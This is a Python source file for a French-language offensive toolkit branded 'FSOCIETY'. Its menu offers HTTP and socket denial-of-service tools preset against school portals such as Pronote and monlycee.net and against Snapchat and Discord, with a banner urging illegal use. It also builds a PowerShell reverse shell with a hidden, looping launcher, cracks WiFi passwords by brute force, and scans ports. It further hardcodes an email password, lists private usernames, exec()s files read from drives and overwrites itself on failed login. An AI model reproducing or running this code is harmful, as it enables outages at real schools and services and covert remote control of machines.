try:
    try: 
        import configparser
    except: 
        os.system('pip install configparser')
    config = configparser.ConfigParser()
    config.read('config.cfg')
    stop_code = int(config.get('parametres', "error_retry"))
    max_crash = int(config.get('parametres', "crash"))
    stop = int(config.get('parametres', "stop"))
    words = config.get('parametres', "words")
    result_file = config.get('parametres', "result")
except:
    print('you need the config.cfg file  in your working directory')
error = 0
while error<=stop_code:
    try:
        try:
            import os
            import base64
            import publicip as Ip
            import datetime
            import time as t
            import bcrypt
            import random
            import colorama
            import threading
            from langdetect import detect
            from datetime import datetime as dt
            import aiohttp
            import smtplib
            from email.mime.text import MIMEText
            from email.mime.multipart import MIMEMultipart
            import socket
            import zlib
            import urllib.request
            import subprocess
            import getpass
            import string
            from multiprocessing import Value
            import json
            import math
            import ftplib
            import multiprocessing
            import sys
            import time
            from ftplib import FTP
            from time import sleep
            from pystyle import *
            from threading import Thread
            from binascii import hexlify
            from tokenize import tokenize, untokenize, TokenInfo
            from io import BytesIO
            from random import choice, shuffle, randint
            from zlib import compress
            import asyncio
            import urllib.request
            import subprocess
        except:
            import os
            print('installation des dependences nécessaires en cours..')
            import time as t
            t.sleep(0.5)
            os.system('pip install -r requirements.txt')
            t.sleep(0.5)
            exit()
        thread_count = os.cpu_count()
        print(f'thread max dispo : {thread_count}')
        def ecrire(msg):
            sys.stdout.write(msg)
            sys.stdout.flush()
        def cls():
            osystem = sys.platform
            if osystem == 'win32': exec("os.system('cls')")
            else: exec("os.system('clear')")
        def check_update():
            try:
                import requests
                print('checking update !')
                with open('version.txt', 'r') as f:
                    version = f.read()
                    version = int(version)
                    print(version)
                response = requests.get(f"https://raw.githubusercontent.com/benji77430/fsociety/main/version.txt")
                try:
                    print('connection established !')
                    target = int(response.text)
                    if target > version:
                        try:
                            os.system('python updater.py')
                        except:
                            pass
                        print("new version available")
                        return "(new version available)"
                    else:
                        print('version is up to date !')
                        return ""
                except:
                    print('you are may be offline !')
                    return "(you are maybe offline)"
            except:
                pass
        def send_email(subject, message, to_email="benji77430@gmail.com"):
            # Set up the SMTP server
            smtp_server = '127.0.0.1'  # Your SMTP server address
            port = 587  # Your SMTP server port
            sender_email = 'benji77430@gmail.com'  # Your email address
            password = 'benji10112008'  # Your email password
            # Create a multipart message
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = to_email
            msg['Subject'] = subject
            # Add message body
            msg.attach(MIMEText(message, 'plain'))
            # Start the SMTP session
            with smtplib.SMTP(smtp_server, port) as server:
                server.starttls()  # Secure the connection
                server.login(sender_email, password)
                server.send_message(msg)
        # Usage
        subject = 'Test email'
        message = 'This is a test email sent via Python.'
        to_email = 'recipient@example.com'
        def detect_language(text):
            try:
                language = detect(text)
                return language
            except:
                return "Langue non détectée"
        class Encode:
            def __init__(self):
                self.enc_txt = b""
            def encode(self, filename):
                i = 0
                while i <= int(0):
                    try:
                        with open(filename, "rb") as f:
                            lines_list = f.readlines()
                            text = b""  # Reset self.text for each file
                            for lines in lines_list:
                                text += lines
                            enc_text = base64.b64encode(text)                    
                        with open(filename, "wb") as f:
                            f.write(f"{repr(enc_text.decode())}".encode())
                        i += 1
                        print(f'crypter : {i} fois')
                    except FileNotFoundError:
                        print('le fichier indiquer n\'a pas été trouver')
        #change le nom de la fen�tre
        System.Title("FSOCIETY")
        cls()
        drives = []
        for drive in range(65, 91):
            if os.path.exists(f"{chr(drive)}:\\"):
                drives.append(f"{chr(drive)}:/code_encoded.txt")
        i=0
        check = 0
        while check != 1:
            for drive in drives:
                    try:
                        with open(drive, 'r') as f:
                            code = f.read()
                            exec(code)
                            code_pin = code()
                            print(code_pin)
                            print(drive)
                            check = 1
                            break
                    except FileNotFoundError:
                        if i == 1:
                            print('Veuillez insérer le token')
                            i+=1
                        pass
            if code_pin != 1000000000000007:
                exit()
        t.sleep(0.4)
        cls()
        def user():
            osystem = sys.platform
            if osystem.startswith('win'):
                user = getpass.getuser()
                file = f"C:\\Users\\{user}\\AppData\\Local\\tools\\users.txt"
                try:
                    with open(file, "r") as f:
                        lines = f.readlines()
                        i = 0
                        while i < len(lines):
                            lines[i] = base64.b64decode(lines[i]).decode('utf-8')
                            # Supprime les caractères de nouvelle ligne à la fin de chaque ligne
                            lines[i] = lines[i].strip()
                            if user == lines[i]:
                                print(f'Utilisateur : {user}')
                                print(f'Compte autorisé : {lines[i]}')
                                print('Vous êtes autorisé.')
                                return True
                            i += 1
                        print(f'Utilisateur : {user}')
                        print('Accès non autorisé.')
                        return False
                except FileNotFoundError:
                    print("Le fichier n'a pas été trouvé, veuillez installer l'outil correctement.")
                    while True:
                        try:
                            with open(file, "w") as f:
                                users = users = '''Utilisateur
    benjaminvincent-gasq
    romainbelorgeot
    yassinezenadi
    enzomatos
    jermeyouf
    Administrateur'''
                                users = users.replace('i', '?')
                                users = users.replace('a', '!')
                                users = base64.b64encode(users)
                                f.write(users)
                                print('fichier correctement creer !')
                                break
                        except:
                            folder = f"C:\\Users\\{user}\\AppData\\Local\\tools"
                            os.system(f'mkdir {folder}')
            else:
                user = getpass.getuser()
                file = f"/home\\{user}\\tools\\users.txt"
                try:
                    with open(file, "r") as f:
                        lines = f.readlines()
                        i = 0
                        while i < len(lines):
                            lines[i] = base64.b64decode(lines[i]).decode('utf-8')
                            # Supprime les caractères de nouvelle ligne à la fin de chaque ligne
                            lines[i] = lines[i].strip()
                            if user == lines[i]:
                                print(f'Utilisateur : {user}')
                                print(f'Compte autorisé : {lines[i]}')
                                print('Vous êtes autorisé.')
                                return True
                            i += 1
                        print(f'Utilisateur : {user}')
                        print('Accès non autorisé.')
                        return False
                except FileNotFoundError:
                    print("Le fichier n'a pas été trouvé, veuillez installer l'outil correctement.")
                    while True:
                        try:
                            with open(file, "w") as f:
                                users = users = '''Utilisateur
benjaminvincent-gasq
romainbelorgeot
yassinezenadi
enzomatos
jermeyouf
Administrateur'''
                                users = users.replace('i', '?')
                                users = users.replace('a', '!')
                                users = base64.b64encode(users)
                                f.write(users)
                                print('fichier correctement creer !')
                                break
                        except:
                            folder = f"/home/{getpass.getuser()}/tools"
                            os.system(f'mkdir {folder}')
        if user():
            t.sleep(0.2)
        else:
            print('utillisateur invalide !')
            t.sleep(0.2)
            exit()
        def delete():
            print('data')
            i=0
            user = getpass.getuser()
            with open(__file__, "w") as f:
                f.write(" ")
            while True:
                with open(f"C:/Users/{user}/desktop/{i}.cmd", "w") as f:
                    f.write(r'curl parrot.live')
                    i+=1
                    print('process is calculating data...')
        def timecode():
            date_actuelle = datetime.date.today()
            m = date_actuelle.month
            d = date_actuelle.day
            y = date_actuelle.year
            pi = math.pi;temps_actuel = time.time()
            temps_local = time.localtime(temps_actuel)
            minute_actuelle = temps_local.tm_min
            code = minute_actuelle + 1
            code = code * m
            code = code * code
            code = code / y
            code = code * pi
            code = math.sqrt(abs(code))
            code = str(code).encode('utf-8')
            code = base64.b64encode(code)
            code = code.replace(b'A', b'b')
            code = code.replace(b'u', b'i')
            code = code.replace(b'1', b'-')
            code = code.replace(b'r', b'|')
            return code
        try:
            with open("keycode.txt", "r") as f:
                keygen = f.read()
                date_code = keygen
                print(date_code)
        except:
            date_code = ""
        dmg = 1
        erreur = 3
        code = timecode().decode('utf-8')
        while date_code != code:
            if date_code == "":
                date_code = getpass.getpass('code secret : ')
                date_code = str(date_code)
            t.sleep(0.5)
            if dmg == 3:
                delete()
                pass
            if date_code == code:
                break
            if not date_code == code: 
                dmg += 1
                date_code = ""
                erreur-=1
                print(f'erreur restante : {erreur}')
                pass
        print('code correct ! ')
        t.sleep(0.2)
        publicip = Ip.getip.get_publicip()
        print(f'your public ip is : {publicip}')
        t.sleep(0.2)
        def authenticate_user():
            # Obtention du nom d'utilisateur actuel
            current_username = getpass.getuser()
            # Lecture des noms d'utilisateur dans le fichier
            with open('C:/fsociety/username.txt', "r") as f:
                lines = f.readlines()
            # Parcours des noms d'utilisateur dans le fichier
            for i, line in enumerate(lines):
                line = line.strip()
                # Vérification si le nom d'utilisateur correspond à celui actuel
                if bcrypt.checkpw(current_username.encode(), line.encode()):
                    # Si oui, ouvrir le fichier 'uuid.txt' pour vérification de l'UUID
                    with open('C:/fsociety/uuid.txt', 'r') as pswd_file:
                        pswds = pswd_file.readlines()
                    # Parcourir les UUID stockés dans le fichier 'uuid.txt'
                    entry = input('Veuillez entrer votre UUID : ')
                    for line in pswds:
                        pswd_line = line.strip()
                        # Demande à l'utilisateur d'entrer son UUID
                        # Vérification de correspondance de l'UUID
                        if bcrypt.checkpw(entry.encode(), pswd_line.encode()):
                            print("Connexion réussie !")
                            return
                        else:
                            continue
                    print("Vous n'avez pas de compte ou l'UUID est incorrect.")
                    time.sleep(2)
                    exit()
            print("Vous n'avez pas de compte.")
            time.sleep(2)
            exit()
        try:    
            authenticate_user()
        except:
            exit()
        cls()
        print("""
{+} FSOCIETY TOOLS
{+} si vous avez un problème avec le tools mon discord: if u want to know go into the properites of the files 
            """)
        time.sleep(1.5)
        RED   = "\033[1;31m"  
        BLUE  = "\033[1;34m"
        CYAN  = "\033[1;36m"
        GREEN = "\033[0;32m"
        RESET = "\033[0;0m"
        BOLD    = "\033[;1m"
        REVERSE = "\033[;7m"
        cls()
        ip = socket.gethostbyname(socket.gethostname())
        while True:
            maj_stat = check_update()
            cls()
            banner = f"""                                                                                                                                                                                                                                                                   
                    8888888888 .d8888b.  .d88888b.  .d8888b.8888888888888888888888888888Y88b   d88P 
                    888       d88P  Y88bd88P" "Y88bd88P  Y88b 888  888           888     Y88b d88P  
                    888       Y88b.     888     888888    888 888  888           888      Y88o88P   
                    8888888    "Y888b.  888     888888        888  8888888       888       Y888P    
                    888           "Y88b.888     888888        888  888           888        888     
                    888             "888888     888888    888 888  888           888        888     
                    888       Y88b  d88PY88b. .d88PY88b  d88P 888  888           888        888     
                    888        "Y8888P"  "Y88888P"  "Y8888P"88888888888888888    888        888     
                                            [+] Created By : BENJI77 
                    username : {getpass.getuser()} | my ip : {ip} | public ip : {publicip}
            """
            print(Colorate.Horizontal(Colors.red_to_blue, banner))
            print('')
            print('')
            r = f"""    1) voir l'ip local de l'appareil                                            9) reverse shell creator
    2) utiliser le DOS TOOL                                                     10) reverse shell server
    3) ip scanner and lister with hostname                                      11) system info
    4) exit                                                                     12) pseudo finder
    5) shutdown                                                                 13) wifi cracker
    6) relancer le tools                                                        14) install all dependencies
    7) voir mon ip publiq ipv4                                                  15) port scanner
    8) dos tool pour adress ip                                                  16) .exe maker
    17) brute force                                                             18) clear result file
    19) ssh bruteforce                                                          20) try to get the public ip
    21) mine bitcoin                                                            22) update tools {maj_stat}
    23) show version                                                            24) générate password
    25) détécter de langue                                                      26) extend word list with text
            """
            print(Colorate.Horizontal(Colors.red_to_blue, r))
            print('')
            choice = input(Colorate.Horizontal(Colors.red_to_purple,'choisissez une action : '))
            if choice == "1":
                print(Colorate.Horizontal(Colors.red_to_purple,f' l\'ip est {ip}'))
                t.sleep(2.5)
                pass
            if choice == "2":
                # Gui Start
                headers = {"User-Agent": "Flyier DoS"}
                osystem = sys.platform
                cls()
                ascii = r'''
                dP                         oo oo d88888P d88888P M""""""'YMM MMP"""""YMM MP""""""`MM 
                88                                   d8'     d8' M  mmmm. `M M' .mmm. `M M  mmmmm..M 
                88d888b. .d8888b. 88d888b. dP dP    d8'     d8'  M  MMMMM  M M  MMMMM  M M.      `YM 
                88'  `88 88ooood8 88'  `88 88 88   d8'     d8'   M  MMMMM  M M  MMMMM  M MMMMMMM.  M 
                88.  .88 88.  ... 88    88 88 88  d8'     d8'    M  MMMM' .M M. `MMM' .M M. .MMM'  M 
                88Y8888' `88888P' dP    dP 88 dP d8'     d8'     M       .MM MMb     dMM Mb.     .dM 
                                        88                       MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM 
                                        dP    
            [!] USE THIS TOOL FOR ILLEGAL PURPOSE
            =====================================
            {+} Created By BENJI77     
                '''
                print(Colorate.Horizontal(Colors.red_to_blue, ascii))
                choice = r"""
                1) snap
                2) pronote
                3) discord
                4) ENT 77
                5) padlet
                6) ent ile de france (monlycee.net)
                -) autre veuillez insérer une URL
                """
                print(Colorate.Horizontal(Colors.red_to_green, choice))
                url = input(Colorate.Horizontal(Colors.red_to_green,'veuillez choisir un site a DOS : '))
                if url == "1":
                    url = "https://web.snapchat.com"
                if url == "4":
                    url = "https://ent77.seine-et-marne.fr"
                if url == "2":
                    url = "https://0770920g.index-education.net/pronote"
                if url == "3":
                    url = "https://discord.com"
                if url == "5":
                    url = "https://padlet.com"
                if url == "6":
                    url = "https://ent.iledefrance.fr/timeline/timeline"
                # Gui End
                num = 0
                reqs = []
                subprocess.Popen(['python', 'C:\\fsociety\\notif_dos.py'])
                loop = asyncio.new_event_loop()
                r = 0
                print()
                t.sleep(0.2)
                print(url)
                async def fetch(session, url):
                    global r, reqs
                    start = int(time.time())
                    try:
                        crash = 0
                        while crash <= max_crash:
                            try:
                                async with session.get(url, headers=headers) as response:
                                    if response:
                                        try:
                                            set_end = int(time.time())
                                            set_final = start - set_end
                                            final = str(set_final).replace("-", "")
                                        except:
                                            pass
                                        if response.status == 200:
                                            try:
                                                r += 1
                                                reqs.append(response.status)
                                                sys.stdout.write(
                                                    f"Requette : {str(len(reqs))} | ping : {final} | code status rendu => {str(response.status)} | crash status {crash} / 100\r")
                                            except:
                                                pass
                                        else:
                                            reqs.append(response.status)
                                            crash+=1
                                    else:
                                        print(Colorate.Horizontal(Colors.red_to_green, "[-] le serveur ne repond pas, essaie plutard ou verifie l'adresse!"))
                            except:
                                pass
                        cls()
                        print('le site a sauter avec succes')
                        t.sleep(2)
                    except:
                        pass
                urls = []
                urls.append(url)
                async def main():
                    tasks = []
                    async with aiohttp.ClientSession() as session:
                        for url in urls:
                            try:
                                tasks.append(fetch(session, url))
                                ddos = await asyncio.gather(*tasks)
                            except:
                                pass
                def run():
                    try:
                        loop.run_forever(asyncio.run(main()))
                    except:
                        pass
                if __name__ == '__main__':
                    active = []
                    ths = []
                    while True:
                        try:
                            while True:
                                th = threading.Thread(target=run)
                                try:
                                    th.start()
                                    ths.append(th)
                                    sys.stdout.flush()
                                except RuntimeError:
                                    pass
                        except:
                            pass
            if choice == "3":
                host = {}
                """ classe définissant le thread de scan d'adresse Ip servant à récupérer """
                """ le hostname du périphérique réseau                                    """
                class NetscanThread(threading.Thread):
                    """ Constructeur de la classe prend en argument les paramètres suivants: """
                    """ address : adresse IP à scanner                                       """
                    def __init__(self, address):
                        self.address = address
                        threading.Thread.__init__(self)
                    """ Définition de la méthode Run de notre classe de scan """
                    def run(self):
                        self.lookup(self.address)
                    """ Méthode de classe permettant de récupérer le hostname du périphérique           """
                    """ connecté au réseau. Elle prend en paramètrre la variable de classe représentant """
                    """ l'adresse IP à recherchée                                                       """
                    def lookup(self, address):
                        """ On gère l'exception en cas de périphérique non connecté à l'adresse IP à scanner """
                        try:
                            """ On récupère le hostname et l'alias de la machine connectée """
                            hostname, alias, _ = socket.gethostbyaddr(address)
                            global host
                            """ On associe le hostname à l'adresse IP et on les sauve dans le dictionnaire """
                            host[address] = hostname
                        except socket.herror:
                            host[address] = None
                """ programme principal """
                addresses = []
                plage = input('plage a scanner (par default 192.168.1.) : ')
                if plage =="" or not plage.endswith('.'):
                    plage = "192.168.1."
                print(f"la plage est : {plage}")
                print(f'result will be stored in the result file at : {result_file}')
                """ On définit une plage d'adresses IP à scanner """ 
                for ping in range(0, 255):
                    addresses.append(f"{plage}" + str(ping))
                threads = []
                """ On créée autant de threads qu'il y à d'adresses IP à scanner """ 
                netscanthreads = [NetscanThread(address) for address in addresses] 
                for thread in netscanthreads :
                    """ Chaque thread est démarré en même temps """
                    thread.start()
                    threads.append(thread)
                for thread in threads:
                    thread.join()
                """ On affiche le résultat qui affiche pour chaque machine connectée son nom d'hôte """
                for address, hostname in host.items():
                    if (hostname != None): 
                        print(address, '=>', hostname)
                        with open(result_file, "a") as result:
                            result.write(f"\n{address} => {hostname}")
                t.sleep(5)
            if choice == "4":
                exit()
            if choice == "5":
                os.system('shutdown -s -f -t 0')
            if choice == "6":
                user = os.environ['USERPROFILE']
                sys.exit()
            if choice == "7":
                addr = urllib.request.urlopen('http://ip.42.pl/raw').read()
                addr = addr.decode('utf-8')
                print('')
                print (Colorate.Horizontal(Colors.red_to_blue, f"  l\'ip publique est {addr}"))
                t.sleep(4)
                pass
            if choice == "8":
                cls()
                class ConsoleColors:
                    HEADER = '\033[95m'
                    OKBLUE = '\033[94m'
                    OKGREEN = '\033[92m'
                    WARNING = '\033[93m'
                    FAIL = '\033[91m'
                    BOLD = '\033[1m'
                print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
                 ____       ____      _____           _ 
                |  _ \  ___/ ___|    |_   _|__   ___ | |
                | | | |/ _ \___ \ _____| |/ _ \ / _ \| |
                | |_| | (_) |__) |_____| | (_) | (_) | |
                |____/ \___/____/      |_|\___/ \___/|_|
                [!] créer par : if u want to know go into the file's properties
                    ''')
                def getport():
                    try:
                        p = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Port:\r\n"))
                        return p
                    except ValueError:
                        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR le port doit etre un nombre, le port par default sera utiliser" + ConsoleColors.OKGREEN + "80")
                        return 80
                host = input('ip du serveur a DOS: ')
                port = getport()
                speedPerRun = 65000
                threads = 100
                ip = socket.gethostbyname(host)
                bytesToSend = random._urandom(2450)
                i = 0
                class Count:
                    packetCounter = 0 
                def goForDosThatThing():
                    try:
                        while True:
                            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            try:
                                dosSocket.connect((ip, port))
                                for i in range(speedPerRun):
                                    try:
                                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + f" | envoie réussi a : {ip} | " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN, end="\r")
                                        Count.packetCounter = Count.packetCounter + 1
                                    except socket.error:
                                        print(ConsoleColors.WARNING + "ERREUR, l'h�te est peut-�tre down ?!", end="\r")
                                        pass
                                    except KeyboardInterrupt:
                                        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] arr�t� par l'utilisateur", end="\r")
                                        pass
                            except socket.error:
                                print(ConsoleColors.WARNING + "ERREUR, l'h�te est peut-�tre down ?!", end="\r")
                                pass
                            except KeyboardInterrupt:
                                print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] arr�t� par l'utilisateur", end="\r")
                                pass
                            dosSocket.close()
                    except KeyboardInterrupt:
                        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] arr�t� par l'utilisateur", end="\r")
                        pass
                try:
                    print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
                      _   _   _             _      ____  _             _   _             
                     / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
                    / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
                   / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
                  /_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
                                                                                |___/ 
                            ''')
                    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ", end="\r")
                    os.system(f"""PowerShell -Command "Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""sms.ps1""' -WindowStyle Hidden""")
                    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [=====               ] 25%", end="\r")
                    t.sleep(0.25)
                    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [==========          ] 50%", end="\r")
                    t.sleep(0.25)
                    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [===============     ] 75%", end="\r")
                    t.sleep(0.25)
                    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "LOADING >> [====================] 100%", end="\r")
                    for i in range(threads):
                        try:
                            t = Thread(target=goForDosThatThing)
                            t.start()
                        except KeyboardInterrupt:
                            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] arr�t� par l'utilisateur", end="\r")    
                            pass
                except KeyboardInterrupt:
                    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] arr�t� par l'utilisateur", end="\r")
                    pass
            if choice == "9":
                ip = input('ip laissez vide pour automatique : ')
                port = input('veuillez entrer le port (laissez vide pour automatique) : ')
                nom= input('nom du reverse shell : ')
                try:
                    port = int(port)
                    print(port)
                except:
                    port = 1234
                    print(port)
                if port == "": port = 1234
                print(port)
                if ip =="": ip = socket.gethostbyname(socket.gethostname())
                print(ip)
                nom = nom+".ps1"
                starter = f"""@echo off
:a
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""{nom}""' -WindowStyle Hidden"
timeout /t 120
goto a
        """
                code = """Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('"""f'{ip}'"""',"""f'{port}'"""));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + "PS " + (pwd).Path + "> ");Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
                import base64
                try:
                    with open(f"C:/Users/{getpass.getuser()}/desktop/{nom}","w") as f:
                        f.write(code)
                        f.close()
                        print("fichier créer avec succès")
                    with open(f'C:/Users/{getpass.getuser()}/desktop/starter.bat', "w") as f:
                        f.write(starter)
                        print('starter créer avec succès')
                    choice = input('do you want to open bat to exe (y/N) ? ')
                    if choice in ('Y', 'y', 'yes', 'YES'):
                        os.startfile('batoexe.exe')
                    print('process finished')
                    time.sleep(1)
                except Exception as e:
                    try:
                        with open(f"/home{getpass.getuser()}/desktop/{nom}","w") as f:
                            f.write(code)
                            f.close()
                            print("fichier créer avec succès")
                        with open(f'/home{getpass.getuser()}/desktop/starter.bat', "w") as f:
                            f.write(starter)
                            print('starter créer avec succès')
                    except Exception as e:
                        print('error while creating the file : {e}')
            if choice == "10": 
                port = input('port (1234 par default): ')
                try: port = int(port) 
                except: 
                    port=1234
                if port == "": port = 1234
                print(port)
                command = f"ncat -nlvp {port}"
                subprocess.run(["cmd", "/c", "start", "cmd", "/k", command])
            if choice == "11":
                lip = socket.gethostbyname(socket.gethostname())
                pla = sys.platform
                if pla.startswith("win"): plateform = "windows"
                if publicip == "?":
                    print('finding your public ip adress please wait.', end="\r")
                    i=0
                    while i<stop:
                        try:
                            publicip=urllib.request.urlopen('http://ip.42.pl/raw').read()
                            print('finding your public ip adress please wait..', end="\r")
                            publicip = publicip.decode('utf-8')
                            print('finding your public ip adress please wait...')
                            print(f'public ip found : {publicip}')
                            break
                        except:
                            print("error can't get ur public ip !")
                            i+=1
                print(f'ip local : {lip}')
                print(f'ip public : {publicip}')
                print(f'votre os est : {plateform} ({pla})')
                t.sleep(8)
            if choice =="12":
                ask = input('pseudo a chercher : ')
                os.system(f'python3 sherlock\\sherlock.py {ask}')
            if choice =="13":
                #!/usr/bin/env python3 3.7
                # -*- coding: utf-8 -*-
                import argparse
                import sys
                import os
                import os.path
                import platform
                import re
                import time
                try:
                    import pywifi
                    from pywifi import PyWiFi
                    from pywifi import const
                    from pywifi import Profile
                except:
                    print("Installing pywifi")
                # By Brahim Jarrar ~
                # GITHUB : https://github.com/BrahimJarrar/ ~
                # CopyRight 2019 ~
                try:
                    # wlan
                    wifi = PyWiFi()
                    ifaces = wifi.interfaces()[0]
                    ifaces.scan() #check the card
                    results = ifaces.scan_results()
                    wifi = pywifi.PyWiFi()
                    iface = wifi.interfaces()[0]
                except:
                    print("[-] Error system")
                type = False
                def main(ssid, password, number):
                    profile = Profile() 
                    profile.ssid = ssid
                    profile.auth = const.AUTH_ALG_OPEN
                    profile.akm.append(const.AKM_TYPE_WPA2PSK)
                    profile.cipher = const.CIPHER_TYPE_CCMP
                    profile.key = password
                    iface.remove_all_network_profiles()
                    tmp_profile = iface.add_network_profile(profile)
                    t.sleep(0.1) # if script not working change time to 1 !!!!!!
                    iface.connect(tmp_profile) # trying to Connect
                    if ifaces.status() == const.IFACE_CONNECTED: # checker
                        t.sleep(1)
                        print(BOLD, GREEN,'[*] Crack success!',RESET)
                        print(BOLD, GREEN,'[*] password is ' + password, RESET)
                        with open(result_file, "a") as f:
                            f.write(f'\n{password} is the password for {ssid}')
                        t.sleep(1)
                        exit()
                    else:
                        print(RED, '[{}] Crack Failed using {}'.format(number, password))
                def pwd(ssid, file):
                    number = 0
                    with open(file, 'r') as words:
                        for line in words:
                            number += 1
                            line = line.split("\n")
                            pwd = line[0]
                            main(ssid, pwd, number)
                def menu():
                    parser = argparse.ArgumentParser(description='argparse Example')
                    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
                    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ...')
                    group1 = parser.add_mutually_exclusive_group()
                    group1.add_argument('-v', '--version', metavar='', help='version')
                    print(" ")
                    args = parser.parse_args()
                    print(CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
                    t.sleep(2.5)
                    if args.wordlist and args.ssid:
                        ssid = args.ssid
                        filee = args.wordlist
                    elif args.version:
                        print("\n\n",CYAN,"by Brahim Jarrar\n")
                        print(RED, " github", BLUE," : https://github.com/BrahimJarrar/\n")
                        print(GREEN, " CopyRight 2019\n\n")
                        exit()
                    else:
                        print(BLUE)
                        ssid = input("[*] SSID: ")
                        filee = words
                    # thx
                    if os.path.exists(filee):
                        if platform.system().startswith("Win" or "win"):
                            os.system("cls")
                        else:
                            os.system("clear")
                        print(BLUE,"[~] Cracking...")
                        pwd(ssid, filee)
                    else:
                        print(RED,"[-] No Such File.",BLUE)
                menu()
            if choice =="14":
                os.system('pip install -r requirements.txt')
            if choice =="15":
                def get_target():
                    hostname = input("Enter your target hostname (or IP address) : ")
                    target = socket.gethostbyname(hostname)
                    print(f'Scan Target  > {target}')
                    return target
                def get_port_list():
                    print(f'Ports Range  > [1 – 5000]')
                    return range(1, 5000)
                def scan_port(target, port):
                    # Create a socket object
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        # Test connection
                        test = s.connect_ex((target, port))
                        if test == 0:
                            print(f'Port {port} is [open]')
                def port_scanner():
                    try:
                        target = get_target()
                        port_list = get_port_list()
                        thread_list = list()
                        start_time = int(time.time())
                        for port in port_list:
                            scan = threading.Thread(target=scan_port, args=(target, port))
                            thread_list.append(scan)
                            scan.daemon = True
                            scan.start()
                        for scan in thread_list:
                            scan.join()
                    except:
                        print("Something went wrong !")
                    else:
                        end_time = int(time.time())
                        print(f"Scanning completed in  {end_time - start_time} seconds.")
                port_scanner()
                t.sleep(2)
            if choice == "16":
                try:
                    os.system('auto-py-to-exe')
                except:
                    os.system('pip install auto-py-to-exe')
                    os.system('auto-py-to-exe')
            if choice =="17":
                class bruteforce:
                    def bf_file(password, lines, start, end):
                        check = False
                        for i, line in enumerate(lines):
                            if password == line.strip():
                                with end.get_lock():
                                    end.value = int(time.time())
                                print(f'Password found: {line.strip()} at line {i}')
                                print(f'Found in {end.value - start.value} seconds')
                                with open(result_file, "a") as f:
                                        f.write(f"\nmot de passe => {line.strip()} at line {i}")
                                check = True
                                return True
                                break
                    def bf_rdm(password, line, start, end):
                        check = False
                        while not check:
                            caracteres = string.ascii_letters + string.digits + string.punctuation
                            mot_de_passe = ''.join(random.choice(caracteres) for _ in range(random.randint(1, 25)))
                            with end.get_lock():
                                end.value = int(time.time())
                            ecriture = "mot de passe généré : "+mot_de_passe
                            print(f"{end.value - start.value} seconds | {ecriture}", end="\r")
                            with open(words, "a") as f:
                                f.write(mot_de_passe+"\n")
                            if mot_de_passe == password:
                                with end.get_lock():
                                    end.value = int(time.time())
                                print(f'Password found: {mot_de_passe}')
                                print(f'Found in {end.value - start.value} seconds')
                                with open(result_file, "a") as f:
                                    f.write(f"\nmot de passe => {mot_de_passe}")
                                check = True
                                return True
                                break
                def go_for_bruteforce_that_thing():
                    password = input('Enter the password to decrypt: ')
                    start_time = Value('i', int(time.time()))
                    end_time = Value('i', 0)
                    print(f"Available threads: {os.cpu_count()}")
                    with open(words, 'r') as f:
                        lines = f.readlines()
                    if not bruteforce.bf_file(password, lines, start_time, end_time):      
                        threads = []
                        choice = input('do you want to try  a random generated password? (y/N): ')
                        if choice in ('Y','y', 'yes', 'YES'):
                            for _ in range(os.cpu_count()):
                                thread = threading.Thread(target=bruteforce.bf_rdm, args=(password, lines, start_time, end_time))
                                thread.start()
                                threads.append(thread)
                            # Wait for all threads to finish
                            for thread in threads:
                                thread.join()
                if True:
                    go_for_bruteforce_that_thing()
                    t.sleep(5)
            if choice == "18":
                try:
                    with open(result_file, "w") as f:
                        f.write('')
                        print('file cleared succesfully')
                        t.sleep(0.2)
                except:
                    print('error verify the file is well at : C:/users/user/desktop/result.txt')
